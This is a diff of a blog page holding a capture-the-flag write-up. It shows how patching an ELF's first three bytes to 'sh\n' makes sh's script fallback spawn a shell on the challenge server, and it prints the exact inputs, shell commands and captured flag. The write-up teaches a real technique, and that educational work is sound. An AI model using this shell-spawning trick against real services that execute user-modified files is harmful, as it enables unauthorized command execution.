@@ -9,27 +9,27 @@
 <span class=n>sh</span><span class=p>:</span> <span class=mi>1</span><span class=p>:</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>tmpbFs4fRmutated_elf</span><span class=p>:</span> <span class=n>Exec</span> <span class=n>format</span> <span class=n>error</span>
 </code></pre></div><p>This was exactly my first input, and I didn't know what to expect exactly from the remote service. I also ignored this error (which was the key point), and figured I would try to find something to exploit.</p><p>I tried some other inputs to see that the service was written in Python:</p><div class=codehilite><pre><span></span><code><span class=o>==================================================</span>
 
-<span class=n>You</span> <span class=n>may</span> <span class=n>mutate</span> <span class=n>up</span> <span class=k>to</span> <span class=mi>4</span> <span class=n>bytes</span> <span class=k>of</span> <span class=n>the</span> <span class=n>elf</span><span class=p>.</span>
-<span class=n>How</span> <span class=n>many</span> <span class=n>bytes</span> <span class=k>to</span> <span class=n>mutate</span> <span class=p>(</span><span class=mi>0</span> <span class=o>-</span> <span class=mi>4</span><span class=p>)</span><span class=o>?</span> <span class=mi>1</span>
-<span class=n>Which</span> <span class=n>byte</span> <span class=k>to</span> <span class=n>mutate</span><span class=o>?</span> <span class=n>okweofkqwwqokfoqkf</span>
-<span class=n>Traceback</span> <span class=p>(</span><span class=n>most</span> <span class=n>recent</span> <span class=k>call</span> <span class=k>last</span><span class=p>):</span>
-  <span class=n>File</span> <span class=ss>&quot;chal.py&quot;</span><span class=p>,</span> <span class=n>line</span> <span class=mi>27</span><span class=p>,</span> <span class=k>in</span> <span class=o>&lt;</span><span class=n>module</span><span class=o>&gt;</span>
-    <span class=n>pos</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>raw_input</span><span class=p>(</span><span class=s1>&#39;Which byte to mutate? &#39;</span><span class=p>))</span>
-<span class=n>ValueError</span><span class=p>:</span> <span class=n>invalid</span> <span class=n>literal</span> <span class=k>for</span> <span class=nb>int</span><span class=p>()</span> <span class=k>with</span> <span class=n>base</span> <span class=mi>10</span><span class=p>:</span> <span class=s1>&#39;okweofkqwwqokfoqkf&#39;</span>
+<span class=nv>You</span> <span class=nv>may</span> <span class=nv>mutate</span> <span class=nv>up</span> <span class=nv>to</span> <span class=mi>4</span> <span class=nv>bytes</span> <span class=nv>of</span> <span class=nv>the</span> <span class=nv>elf</span>.
+<span class=nv>How</span> <span class=nv>many</span> <span class=nv>bytes</span> <span class=nv>to</span> <span class=nv>mutate</span> <span class=ss>(</span><span class=mi>0</span> <span class=o>-</span> <span class=mi>4</span><span class=ss>)</span>? <span class=mi>1</span>
+<span class=nv>Which</span> <span class=nv>byte</span> <span class=nv>to</span> <span class=nv>mutate</span>? <span class=nv>okweofkqwwqokfoqkf</span>
+<span class=nv>Traceback</span> <span class=ss>(</span><span class=nv>most</span> <span class=nv>recent</span> <span class=k>call</span> <span class=nl>last</span><span class=ss>)</span>:
+  <span class=nv>File</span> <span class=s2>&quot;</span><span class=s>chal.py</span><span class=s2>&quot;</span>, <span class=nv>line</span> <span class=mi>27</span>, <span class=nv>in</span> <span class=o>&lt;</span><span class=nv>module</span><span class=o>&gt;</span>
+    <span class=nv>pos</span> <span class=o>=</span> <span class=nv>int</span><span class=ss>(</span><span class=nv>raw_input</span><span class=ss>(</span><span class=s1>&#39;</span><span class=s>Which byte to mutate? </span><span class=s1>&#39;</span><span class=ss>))</span>
+<span class=nv>ValueError</span>: <span class=nv>invalid</span> <span class=nv>literal</span> <span class=k>for</span> <span class=nv>int</span><span class=ss>()</span> <span class=nv>with</span> <span class=nv>base</span> <span class=mi>10</span>: <span class=s1>&#39;</span><span class=s>okweofkqwwqokfoqkf</span><span class=s1>&#39;</span>
 </code></pre></div><p>I first thought that maybe there would be an exploit like Python2 <a href=https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/ >input function</a> but after trying every possible input fields it appeared not to be the case.</p><p>It is possible to copy the long hexstring that the server sends into a file and then retrieve a valid ELF binary thanks to this command:</p><div class=codehilite><pre><span></span><code>xxd -r -p hexfile.txt <span class=p>|</span> zlib-flate -uncompress &gt;elf
-</code></pre></div><p>I did reverse the binary but it was not doing anything peculiar so I won't detail the steps here.</p><p>If one decides not to apply any patch, here is the output of the binary:</p><div class=codehilite><pre><span></span><code><span class=o>==================================================</span>
+</code></pre></div><p>I did reverse the binary but it was not doing anything peculiar so I won't detail the steps here.</p><p>If one decides not to apply any patch, here is the output of the binary:</p><div class=codehilite><pre><span></span><code>==================================================
 
-<span class=n>You</span> <span class=n>may</span> <span class=n>mutate</span> <span class=n>up</span> <span class=k>to</span> <span class=mi>4</span> <span class=n>bytes</span> <span class=k>of</span> <span class=n>the</span> <span class=n>elf</span><span class=p>.</span>
-<span class=n>How</span> <span class=n>many</span> <span class=n>bytes</span> <span class=k>to</span> <span class=n>mutate</span> <span class=p>(</span><span class=mi>0</span> <span class=o>-</span> <span class=mi>4</span><span class=p>)</span><span class=o>?</span> <span class=mi>0</span>
-<span class=n>Alright</span> <span class=o>-</span> <span class=n>let</span><span class=err>&#39;</span><span class=n>s</span> <span class=n>see</span> <span class=n>what</span> <span class=n>the</span> <span class=n>elf</span> <span class=n>has</span> <span class=k>to</span> <span class=n>say</span><span class=p>.</span>
-<span class=o>==================================================</span>
-<span class=n>Blabla</span>
-<span class=n>Hello</span> <span class=n>there</span><span class=p>,</span> <span class=n>what</span> <span class=k>is</span> <span class=n>your</span> <span class=n>name</span><span class=o>?</span>
-<span class=n>Greetings</span> <span class=n>Blabla</span><span class=p>,</span> <span class=n>let</span> <span class=n>me</span> <span class=n>sing</span> <span class=n>you</span> <span class=n>a</span> <span class=n>song</span><span class=p>:</span>
-<span class=n>We</span> <span class=n>wish</span> <span class=n>you</span> <span class=n>a</span> <span class=n>Merry</span> <span class=n>Chhistmas</span>
-<span class=n>We</span> <span class=n>wish</span> <span class=n>you</span> <span class=n>a</span> <span class=n>Merry</span> <span class=n>Christmxs</span>
-<span class=n>We</span> <span class=n>wish</span> <span class=n>you</span> <span class=n>alMerry</span> <span class=n>Christmas</span>
-<span class=k>and</span> <span class=n>a</span> <span class=n>HapZy</span> <span class=k>New</span> <span class=k>Year</span><span class=o>!</span>
+You may mutate up to 4 bytes of the elf.
+How many bytes to mutate (0 - 4)? 0
+Alright - let&#39;s see what the elf has to say.
+==================================================
+Blabla
+Hello there, what is your name?
+Greetings Blabla, let me sing you a song:
+We wish you a Merry Chhistmas
+We wish you a Merry Christmxs
+We wish you alMerry Christmas
+and a HapZy New Year!
 </code></pre></div><p>We can notice the challenge author did not flush stdout after asking for the user name, so it was a bit confusing at first when typing 0 and having no output from the service.</p><p>With the binary in hand, I tried to patch the letters in the song (yeah I know it sounds stupid but well there were 4 mistakes and we could do 4 patches) and I got the elf to sing a perfect song, but that's it.</p><p>My friend <a href=https://twitter.com/cy_nics>Nics</a> had to leave and told me to patch the binary to introduce a vulnerability, but I was not satisfied with the way the challenge was working, and I had a feeling there would be something else to exploit.</p><h2>Exec format error</h2><p>As we noticed, when patching the 2<sup>nd</sup> byte, we produced this error message:</p><div class=codehilite><pre><span></span><code><span class=n>sh</span><span class=o>:</span> <span class=mi>1</span><span class=o>:</span> <span class=sr>/var/tmp/</span><span class=n>tmpbFs4fRmutated_elf</span><span class=o>:</span> <span class=n>Exec</span> <span class=n>format</span> <span class=n>error</span>
 </code></pre></div><p>The error says it all: after the binary is modified, <code>sh</code> is started and tries to execute the binary <code>tmpbFs4fRmutated_elf</code>. This can be the case when one uses the function <code>system</code> which creates a process that will execute <code>sh -c commandline</code>. However, in our case, an <code>Exec format error</code> is raised. When I realized that, it took me approximately 30 seconds to pop a shell, but let's try to understand what is really happening.</p><h3>How does bash work?</h3><p>Given the previous outputs, we can guess the underlying program:</p><div class=codehilite><pre><span></span><code><span class=nv>tmpfile</span><span class=o>=</span><span class=k>$(</span>mktemp /var/tmp/tmpXXXXXXmutated_elf<span class=k>)</span><span class=p>;</span>
 apply_patches <span class=nv>$tmpfile</span>
@@ -64,28 +64,28 @@ system<span class=o>(</span><span class=nv>$tmpfile</span><span class=o>)</span>
 
   <span class=k>return</span> <span class=p>(</span><span class=mi>0</span><span class=p>);</span>
 <span class=p>}</span>
-</code></pre></div><p>It will assume a file is a binary file only if no <code>\n</code> file was encountered or if there is a null-byte present.</p><p>So with only 3 bytes to patch, we can write <code>sh\n</code> so the function will return that our file is a text file (because it detects a newline) and it will execute the first command.</p><p>Remember that with the previous Python error, we got the information that our input was read as a base 10 integer.</p><div class=codehilite><pre><span></span><code><span class=o>==================================================</span>
+</code></pre></div><p>It will assume a file is a binary file only if no <code>\n</code> file was encountered or if there is a null-byte present.</p><p>So with only 3 bytes to patch, we can write <code>sh\n</code> so the function will return that our file is a text file (because it detects a newline) and it will execute the first command.</p><p>Remember that with the previous Python error, we got the information that our input was read as a base 10 integer.</p><div class=codehilite><pre><span></span><code>==================================================
 
-<span class=n>You</span> <span class=n>may</span> <span class=n>mutate</span> <span class=n>up</span> <span class=k>to</span> <span class=mi>4</span> <span class=n>bytes</span> <span class=k>of</span> <span class=n>the</span> <span class=n>elf</span><span class=p>.</span>
-<span class=n>How</span> <span class=n>many</span> <span class=n>bytes</span> <span class=k>to</span> <span class=n>mutate</span> <span class=p>(</span><span class=mi>0</span> <span class=o>-</span> <span class=mi>4</span><span class=p>)</span><span class=o>?</span> <span class=mi>3</span>
-<span class=n>Which</span> <span class=n>byte</span> <span class=k>to</span> <span class=n>mutate</span><span class=o>?</span> <span class=mi>0</span>
-<span class=n>What</span> <span class=k>to</span> <span class=k>set</span> <span class=n>the</span> <span class=n>byte</span> <span class=k>to</span><span class=o>?</span> <span class=mi>115</span>                <span class=o>#</span> <span class=s1>&#39;s&#39;</span>
-<span class=n>Which</span> <span class=n>byte</span> <span class=k>to</span> <span class=n>mutate</span><span class=o>?</span> <span class=mi>1</span>
-<span class=n>What</span> <span class=k>to</span> <span class=k>set</span> <span class=n>the</span> <span class=n>byte</span> <span class=k>to</span><span class=o>?</span> <span class=mi>104</span>                <span class=o>#</span> <span class=s1>&#39;h&#39;</span>
-<span class=n>Which</span> <span class=n>byte</span> <span class=k>to</span> <span class=n>mutate</span><span class=o>?</span> <span class=mi>2</span>
-<span class=n>What</span> <span class=k>to</span> <span class=k>set</span> <span class=n>the</span> <span class=n>byte</span> <span class=k>to</span><span class=o>?</span> <span class=mi>10</span>                 <span class=o>#</span> <span class=s1>&#39;\n&#39;</span>
-<span class=n>Alright</span> <span class=o>-</span> <span class=n>let</span><span class=err>&#39;</span><span class=n>s</span> <span class=n>see</span> <span class=n>what</span> <span class=n>the</span> <span class=n>elf</span> <span class=n>has</span> <span class=k>to</span> <span class=n>say</span><span class=p>.</span>
-<span class=o>==================================================</span>
+You may mutate up to 4 bytes of the elf.
+How many bytes to mutate (0 - 4)? 3
+Which byte to mutate? 0
+What to set the byte to? 115                # &#39;s&#39;
+Which byte to mutate? 1
+What to set the byte to? 104                # &#39;h&#39;
+Which byte to mutate? 2
+What to set the byte to? 10                 # &#39;\n&#39;
+Alright - let&#39;s see what the elf has to say.
+==================================================
 
 
-<span class=n>id</span>
-<span class=n>uid</span><span class=o>=</span><span class=mi>8888</span><span class=p>(</span><span class=n>ctf</span><span class=p>)</span> <span class=n>gid</span><span class=o>=</span><span class=mi>8888</span><span class=p>(</span><span class=n>ctf</span><span class=p>)</span> <span class=n>groups</span><span class=o>=</span><span class=mi>8888</span><span class=p>(</span><span class=n>ctf</span><span class=p>)</span>
-<span class=n>ls</span>
-<span class=n>chal</span><span class=p>.</span><span class=n>py</span>
-<span class=n>elf</span>
-<span class=n>flag</span><span class=p>.</span><span class=n>txt</span>
-<span class=n>cat</span> <span class=n>flag</span><span class=p>.</span><span class=n>txt</span>
-<span class=n>AOTW</span><span class=err>{</span><span class=n>turn1NG_an_3lf_int0_a_M0nst3r</span><span class=o>?</span><span class=err>}</span>
+id
+uid=8888(ctf) gid=8888(ctf) groups=8888(ctf)
+ls
+chal.py
+elf
+flag.txt
+cat flag.txt
+AOTW{turn1NG_an_3lf_int0_a_M0nst3r?}
 </code></pre></div><p>Nice isn't it?</p><h3>Extra</h3><p>Since we are provided a shell, it is possible to check out the challenge source code:</p><div class=codehilite><pre><span></span><code><span class=kn>import</span> <span class=nn>tempfile</span>
 <span class=kn>import</span> <span class=nn>os</span>
 <span class=kn>import</span> <span class=nn>zlib</span>
